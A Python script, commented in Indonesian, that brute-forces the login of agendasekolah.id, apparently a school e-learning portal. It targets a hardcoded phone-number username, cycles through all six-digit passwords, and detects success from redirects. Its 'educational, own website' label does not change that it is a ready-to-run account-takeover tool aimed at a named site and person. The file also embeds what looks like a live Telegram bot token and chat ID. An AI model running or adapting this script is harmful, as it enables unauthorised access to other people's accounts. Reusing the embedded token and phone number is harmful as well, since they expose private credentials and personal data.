#!/usr/bin/env python3
"""
Script Brute Force untuk Testing Website Sendiri
Educational Purpose Only - Testing agendasekolah.id
"""

import requests
import time
import sys
from urllib.parse import urlencode
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class BruteForceLogin:
    def __init__(self):
        # Target website configuration
        self.login_url = "https://agendasekolah.id/pass.asp"
        self.success_indicator = "e_learning_siswa.asp"
        self.failure_indicator = "pass_user.asp"
        
        # Username yang akan digunakan (sesuaikan dengan target testing Anda)
        self.username = "+081288747986"  # GANTI INI DENGAN USERNAME TARGET ANDA!
        
        # Statistics
        self.attempts = 0
        self.start_time = time.time()
        
        # Session untuk maintain cookies
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Notification Settings (opsional - kosongkan jika tidak mau pakai)
        self.telegram_bot_token = "8417649107:AAFc7HeQv2sPr1WSXlnCJFvT00QBPygQ4h4"  # Bot token dari BotFather
        self.telegram_chat_id = "7042482750"    # Chat ID Anda
        self.email_smtp_server = "smtp.gmail.com"
        self.email_smtp_port = 587
        self.email_sender = ""        # Email pengirim
        self.email_password = ""      # App password email
        self.email_receiver = ""      # Email penerima
    
    def generate_passwords(self):
        """Generate password 6 digit dari 000000 sampai 999999"""
        for i in range(1000000):
            yield f"{i:06d}"
    
    def attempt_login(self, username, password):
        """Attempt login dengan credentials yang diberikan"""
        data = {
            'username': username,
            'password': password
        }
        
        try:
            response = self.session.post(
                self.login_url,
                data=data,
                allow_redirects=False,
                timeout=10
            )
            
            # Cek redirect location untuk menentukan success/failure
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if self.success_indicator in location:
                    return 'success'
                elif self.failure_indicator in location:
                    return 'failure'
                else:
                    return f'unknown_redirect: {location}'
            else:
                # Jika tidak ada redirect, cek content response
                content = response.text.lower()
                if self.success_indicator in content:
                    return 'success'
                elif self.failure_indicator in content or 'password' in content:
                    return 'failure'
                else:
                    return f'unknown_response: {response.status_code}'
                    
        except requests.exceptions.RequestException as e:
            return f'error: {str(e)}'
    
    def log_attempt(self, username, password, result, elapsed_time):
        """Log setiap attempt ke console dan file"""
        self.attempts += 1
        current_time = time.time()
        total_elapsed = current_time - self.start_time
        
        log_entry = f"[{self.attempts:06d}] {username}:{password} -> {result} ({elapsed_time:.2f}s) [Total: {total_elapsed:.0f}s]"
        print(log_entry)
        
        # Log ke file juga
        with open('bruteforce.log', 'a') as f:
            f.write(log_entry + '\n')
        
        # Progress info setiap 100 attempts
        if self.attempts % 100 == 0:
            rate = self.attempts / total_elapsed
            print(f"Progress: {self.attempts} attempts, {rate:.2f} attempts/sec")
    
    def run_bruteforce(self):
        """Main brute force loop"""
        print("="*60)
        print("BRUTE FORCE LOGIN TESTING")
        print(f"Target: {self.login_url}")
        print(f"Username: {self.username}")
        print("Password Range: 000000 - 999999")
        print("="*60)
        
        # Log starting info
        with open('bruteforce.log', 'w') as f:
            f.write(f"Brute Force Started: {time.ctime()}\n")
            f.write(f"Target: {self.login_url}\n")
            f.write(f"Username: {self.username}\n")
            f.write("="*60 + "\n")
        
        try:
            for password in self.generate_passwords():
                attempt_start = time.time()
                result = self.attempt_login(self.username, password)
                attempt_time = time.time() - attempt_start
                
                self.log_attempt(self.username, password, result, attempt_time)
                
                if result == 'success':
                    print("\n" + "="*60)
                    print("🎉 PASSWORD FOUND! 🎉")
                    print(f"Username: {self.username}")
                    print(f"Password: {password}")
                    print(f"Total Attempts: {self.attempts}")
                    print(f"Time Taken: {time.time() - self.start_time:.0f} seconds")
                    print("="*60)
                    
                    # Log success ke file
                    with open('bruteforce.log', 'a') as f:
                        f.write(f"\nSUCCESS! Password found: {password}\n")
                        f.write(f"Total attempts: {self.attempts}\n")
                        f.write(f"Time taken: {time.time() - self.start_time:.0f} seconds\n")
                    
                    return password
                
                # Small delay untuk avoid overwhelming server
                time.sleep(0.1)
                
                # Safety break jika ada error berturut-turut
                if 'error' in result and self.attempts > 10:
                    consecutive_errors = 0
                    # Implementasi error handling bisa ditambah di sini
        
        except KeyboardInterrupt:
            print("\n\nBrute force stopped by user")
            print(f"Total attempts made: {self.attempts}")
            with open('bruteforce.log', 'a') as f:
                f.write(f"\nStopped by user after {self.attempts} attempts\n")
        
        except Exception as e:
            print(f"\nUnexpected error: {str(e)}")
            with open('bruteforce.log', 'a') as f:
                f.write(f"\nError: {str(e)}\n")
        
        return None

def main():
    """Main function"""
    # Bisa tambah argument parsing untuk konfigurasi
    if len(sys.argv) > 1:
        username = sys.argv[1]
        print(f"Using custom username: {username}")
    
    brute_forcer = BruteForceLogin()
    
    # Override username jika diperlukan
    if len(sys.argv) > 1:
        brute_forcer.username = sys.argv[1]
    
    print("Starting brute force attack...")
    print("Press Ctrl+C to stop")
    
    result = brute_forcer.run_bruteforce()
    
    if result:
        print(f"Success! Password is: {result}")
    else:
        print("Brute force completed without finding password")

if __name__ == "__main__":
    main()
